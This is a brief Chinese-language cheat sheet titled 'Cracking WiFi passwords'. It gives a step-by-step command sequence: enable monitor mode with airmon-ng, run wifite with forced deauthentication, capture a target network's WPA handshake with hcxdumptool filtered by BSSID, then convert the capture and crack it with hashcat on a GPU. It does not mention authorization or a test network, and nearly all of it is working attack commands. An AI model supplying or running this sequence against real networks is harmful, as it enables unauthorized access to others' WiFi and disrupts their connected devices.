# 破解WIFI密码

### VMWARE-虚拟机-连接网卡
### sudo su
### airmon-ng #查看网卡
### sudo apt install hcxdumptool hcxtools -y #安装必要组件
### sudo airmon-ng check kill && sudo airmon-ng start wlan0 #开启监听
### sudo wifite --no-wps --no-pmkid --wpa --num-deauths 5 -wpat 2000 -5
### sudo airodump-ng --band abg wlan0
### hcxdumptool --bpfc="wlan addr3 (BSSID地址)" > target.bpf
### sudo hcxdumptool -i wlan0 -w handshake.pcapng --bpf=target.bpf --rds=3 -c （信道）（2.4是a，5是b） --tot=15 -A --exitoneapol=7 
### https://hashcat.net/cap2hashcat/ #转换PCAPNG，PCAP或CAP文件
### https://hashcat.net/hashcat/ 下载hashcat binaries。https://developer.nvidia.com/cuda-downloads 下载CUDA
### sudo rm -rf hs #删除hs文件夹

VMware 17.6.4 连接：https://downloads2.broadcom.com/?file=VMware-workstation-full-17.6.4-24832109.exe&oid=47320451&id=a73RvQs2C3LEwUZNy9AVXQIsHUzFbS_I94WQL20BuOcD7tHiWadP--eYd5DMlQiYqoU=&verify=1782955849-L%2Bhb2%2FXHrE4a0hsFUMxniAKoWdE8ZX0xczVAIpnH2Hg%3D
